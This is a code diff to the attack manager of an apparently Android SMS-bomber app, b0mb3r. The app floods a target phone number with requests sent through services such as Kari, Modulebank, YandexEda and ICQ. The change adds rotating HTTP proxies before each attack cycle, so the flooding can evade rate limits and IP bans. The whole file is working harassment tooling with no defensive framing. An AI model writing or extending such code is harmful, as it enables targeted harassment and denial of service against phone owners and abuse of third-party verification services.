@@ -10,10 +10,15 @@ import okhttp3.Dispatcher
 import kotleni.b0mb3r.AttackManager.Attack
 import kotleni.b0mb3r.AttackManager
 import kotleni.b0mb3r.services.*
+import kotleni.b0mb3r.ui.main.MainActivity
+import kotleni.b0mb3r.ui.main.MainRepository
 import okhttp3.Call
 import okhttp3.Callback
 import okhttp3.Interceptor
 import java.io.IOException
+import java.net.InetSocketAddress
+import java.net.Proxy
+import java.time.Duration
 import java.util.ArrayList
 import java.util.concurrent.CountDownLatch
 import kotlin.Throws
@@ -73,6 +78,7 @@ class AttackManager(callback: Callback) {
             callback.onAttackStart(usableServices.size, numberOfCycles)
             Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone))
             for (cycle in 0 until numberOfCycles) {
+                updateClient()
                 Log.i(TAG, String.format("Started cycle %s", cycle))
                 tasks = CountDownLatch(usableServices.size)
                 for (service in usableServices) {
@@ -111,22 +117,39 @@ class AttackManager(callback: Callback) {
 
     companion object {
         private const val TAG = "AttackManager"
+
+        private var proxyId = 0
+        fun updateClient() {
+            val proxies = MainActivity.repository!!.getProxies()
+            if(proxyId > proxies.size - 1) proxyId = 0
+
+            Service.client = Builder().let {
+                if(proxies.isNotEmpty()) {
+                    val cur = proxies[proxyId]
+                    it.proxy(Proxy(Proxy.Type.HTTP, InetSocketAddress(cur.ip, cur.port.toInt())))
+                    println("Used proxy ${cur}")
+                }
+
+                it.addInterceptor(Interceptor { chain ->
+                    val request = chain.request()
+                    Log.v(Companion.TAG, String.format("Sending request %s", request.url))
+                    val response = chain.proceed(request)
+                    Log.v(Companion.TAG, String.format(
+                        "Received response for %s with status code %s",
+                        response.request.url, response.code
+                    ))
+                    return@Interceptor response
+                })
+
+                it.build()
+            }
+
+            proxyId += 1
+        }
     }
 
     init {
-        Service.client = Builder()
-            .addInterceptor(Interceptor { chain ->
-                val request = chain.request()
-                Log.v(TAG, String.format("Sending request %s", request.url))
-                val response = chain.proceed(request)
-                Log.v(
-                    TAG, String.format(
-                        "Received response for %s with status code %s",
-                        response.request.url, response.code
-                    )
-                )
-                response
-            }).build()
+        updateClient()
         this.callback = callback
         services = arrayOf(
             Kari(), Modulebank(), YandexEda(), ICQ(),
